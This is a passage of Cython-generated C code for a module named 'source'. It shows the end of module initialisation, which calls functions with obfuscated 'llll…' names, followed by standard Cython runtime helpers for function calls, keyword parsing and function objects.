    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1938, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_llllllllllllll); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1939, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1939, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_llllllllllllllll, __pyx_t_3) < 0) __PYX_ERR(0, 1939, __pyx_L3_error)
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }

  
  /*finally:*/ {
    /*normal exit:*/{
      __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_llllllllllll); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1942, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_llllllllllllllll); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1942, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1942, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L4;
    }
    __pyx_L3_error:;
    /*exception exit:*/{
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __pyx_t_7 = 0; __pyx_t_8 = 0; __pyx_t_9 = 0; __pyx_t_10 = 0; __pyx_t_11 = 0; __pyx_t_12 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_10, &__pyx_t_11, &__pyx_t_12);
      if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9) < 0)) __Pyx_ErrFetch(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_8);
      __Pyx_XGOTREF(__pyx_t_9);
      __Pyx_XGOTREF(__pyx_t_10);
      __Pyx_XGOTREF(__pyx_t_11);
      __Pyx_XGOTREF(__pyx_t_12);
      __pyx_t_4 = __pyx_lineno; __pyx_t_5 = __pyx_clineno; __pyx_t_6 = __pyx_filename;
      {
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_llllllllllll); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1942, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_llllllllllllllll); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1942, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1942, __pyx_L6_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      }
      if (PY_MAJOR_VERSION >= 3) {
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);
      }
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_9);
      __Pyx_ErrRestore(__pyx_t_7, __pyx_t_8, __pyx_t_9);
      __pyx_t_7 = 0; __pyx_t_8 = 0; __pyx_t_9 = 0; __pyx_t_10 = 0; __pyx_t_11 = 0; __pyx_t_12 = 0;
      __pyx_lineno = __pyx_t_4; __pyx_clineno = __pyx_t_5; __pyx_filename = __pyx_t_6;
      goto __pyx_L1_error;
      __pyx_L6_error:;
      if (PY_MAJOR_VERSION >= 3) {
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);
      }
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_10 = 0; __pyx_t_11 = 0; __pyx_t_12 = 0;
      goto __pyx_L1_error;
    }
    __pyx_L4:;
  }

  
  __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_3) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyCFunctionFastCall */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

/* PyObjectCall2Args */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args, *result = NULL;
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyFunction_FastCall(function, args, 2);
    }
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyCFunction_FastCall(function, args, 2);
    }
    #endif
    args = PyTuple_New(2);
    if (unlikely(!args)) goto done;
    Py_INCREF(arg1);
    PyTuple_SET_ITEM(args, 0, arg1);
    Py_INCREF(arg2);
    PyTuple_SET_ITEM(args, 1, arg2);
    Py_INCREF(function);
    result = __Pyx_PyObject_Call(function, args, NULL);
    Py_DECREF(args);
    Py_DECREF(function);
done:
    return result;
}

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallOneArg */
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

/* PyIntCompare */
static CYTHON_INLINE PyObject* __Pyx_PyInt_EqObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, CYTHON_UNUSED long inplace) {
    if (op1 == op2) {
        Py_RETURN_TRUE;
    }
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long a = PyInt_AS_LONG(op1);
        if (a == b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        int unequal;
        unsigned long uintval;
        Py_ssize_t size = Py_SIZE(op1);
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        if (intval == 0) {
            if (size == 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
        } else if (intval < 0) {
            if (size >= 0)
                Py_RETURN_FALSE;
            intval = -intval;
            size = -size;
        } else {
            if (size <= 0)
                Py_RETURN_FALSE;
        }
        uintval = (unsigned long) intval;
#if PyLong_SHIFT * 4 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 4)) {
            unequal = (size != 5) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[4] != ((uintval >> (4 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 3 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 3)) {
            unequal = (size != 4) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[3] != ((uintval >> (3 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 2 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 2)) {
            unequal = (size != 3) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 1 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 1)) {
            unequal = (size != 2) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
            unequal = (size != 1) || (((unsigned long) digits[0]) != (uintval & (unsigned long) PyLong_MASK));
        if (unequal == 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
        if ((double)a == (double)b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    return (
        PyObject_RichCompare(op1, op2, Py_EQ));
}

/* PyObjectCallNoArg */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif

/* RaiseArgTupleInvalid */
static void __Pyx_RaiseArgtupleInvalid(
    const char* func_name,
    int exact,
    Py_ssize_t num_min,
    Py_ssize_t num_max,
    Py_ssize_t num_found)
{
    Py_ssize_t num_expected;
    const char *more_or_less;
    if (num_found < num_min) {
        num_expected = num_min;
        more_or_less = "at least";
    } else {
        num_expected = num_max;
        more_or_less = "at most";
    }
    if (exact) {
        more_or_less = "exactly";
    }
    PyErr_Format(PyExc_TypeError,
                 "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",
                 func_name, more_or_less, num_expected,
                 (num_expected == 1) ? "" : "s", num_found);
}

/* RaiseDoubleKeywords */
static void __Pyx_RaiseDoubleKeywordsError(
    const char* func_name,
    PyObject* kw_name)
{
    PyErr_Format(PyExc_TypeError,
        #if PY_MAJOR_VERSION >= 3
        "%s() got multiple values for keyword argument '%U'", func_name, kw_name);
        #else
        "%s() got multiple values for keyword argument '%s'", func_name,
        PyString_AsString(kw_name));
        #endif
}

/* ParseKeywords */
static int __Pyx_ParseOptionalKeywords(
    PyObject *kwds,
    PyObject **argnames[],
    PyObject *kwds2,
    PyObject *values[],
    Py_ssize_t num_pos_args,
    const char* function_name)
{
    PyObject *key = 0, *value = 0;
    Py_ssize_t pos = 0;
    PyObject*** name;
    PyObject*** first_kw_arg = argnames + num_pos_args;
    while (PyDict_Next(kwds, &pos, &key, &value)) {
        name = first_kw_arg;
        while (*name && (**name != key)) name++;
        if (*name) {
            values[name-argnames] = value;
            continue;
        }
        name = first_kw_arg;
        #if PY_MAJOR_VERSION < 3
        if (likely(PyString_Check(key))) {
            while (*name) {
                if ((CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**name) == PyString_GET_SIZE(key))
                        && _PyString_Eq(**name, key)) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    if ((**argname == key) || (
                            (CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**argname) == PyString_GET_SIZE(key))
                             && _PyString_Eq(**argname, key))) {
                        goto arg_passed_twice;
                    }
                    argname++;
                }
            }
        } else
        #endif
        if (likely(PyUnicode_Check(key))) {
            while (*name) {
                int cmp = (**name == key) ? 0 :
                #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                    (__Pyx_PyUnicode_GET_LENGTH(**name) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                #endif
                    PyUnicode_Compare(**name, key);
                if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                if (cmp == 0) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    int cmp = (**argname == key) ? 0 :
                    #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                        (__Pyx_PyUnicode_GET_LENGTH(**argname) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                    #endif
                        PyUnicode_Compare(**argname, key);
                    if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                    if (cmp == 0) goto arg_passed_twice;
                    argname++;
                }
            }
        } else
            goto invalid_keyword_type;
        if (kwds2) {
            if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;
        } else {
            goto invalid_keyword;
        }
    }
    return 0;
arg_passed_twice:
    __Pyx_RaiseDoubleKeywordsError(function_name, key);
    goto bad;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    goto bad;
invalid_keyword:
    PyErr_Format(PyExc_TypeError,
    #if PY_MAJOR_VERSION < 3
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
    #else
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
    #endif
bad:
    return -1;
}

/* None */
static CYTHON_INLINE void __Pyx_RaiseClosureNameError(const char *varname) {
    PyErr_Format(PyExc_NameError, "free variable '%s' referenced before assignment in enclosing scope", varname);
}

/* FetchCommonType */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {
    PyObject* fake_module;
    PyTypeObject* cached_type = NULL;
    fake_module = PyImport_AddModule((char*) "_cython_" CYTHON_ABI);
    if (!fake_module) return NULL;
    Py_INCREF(fake_module);
    cached_type = (PyTypeObject*) PyObject_GetAttrString(fake_module, type->tp_name);
    if (cached_type) {
        if (!PyType_Check((PyObject*)cached_type)) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s is not a type object",
                type->tp_name);
            goto bad;
        }
        if (cached_type->tp_basicsize != type->tp_basicsize) {
            PyErr_Format(PyExc_TypeError,
                "Shared Cython type %.200s has the wrong size, try recompiling",
                type->tp_name);
            goto bad;
        }
    } else {
        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;
        PyErr_Clear();
        if (PyType_Ready(type) < 0) goto bad;
        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*) type) < 0)
            goto bad;
        Py_INCREF(type);
        cached_type = type;
    }
done:
    Py_DECREF(fake_module);
    return cached_type;
bad:
    Py_XDECREF(cached_type);
    cached_type = NULL;
    goto done;
}

/* CythonFunctionShared */
#include <structmember.h>
static PyObject *
__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *closure)
{
    if (unlikely(op->func_doc == NULL)) {
        if (op->func.m_ml->ml_doc) {
#if PY_MAJOR_VERSION >= 3
            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);
#else
            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);
#endif
            if (unlikely(op->func_doc == NULL))
                return NULL;
        } else {
            Py_INCREF(Py_None);
            return Py_None;
        }
    }
    Py_INCREF(op->func_doc);
    return op->func_doc;
}
static int
__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp = op->func_doc;
    if (value == NULL) {
        value = Py_None;
    }
    Py_INCREF(value);
    op->func_doc = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_name == NULL)) {
#if PY_MAJOR_VERSION >= 3
        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);
#else
        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);
#endif
        if (unlikely(op->func_name == NULL))
            return NULL;
    }
    Py_INCREF(op->func_name);
    return op->func_name;
}
static int
__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
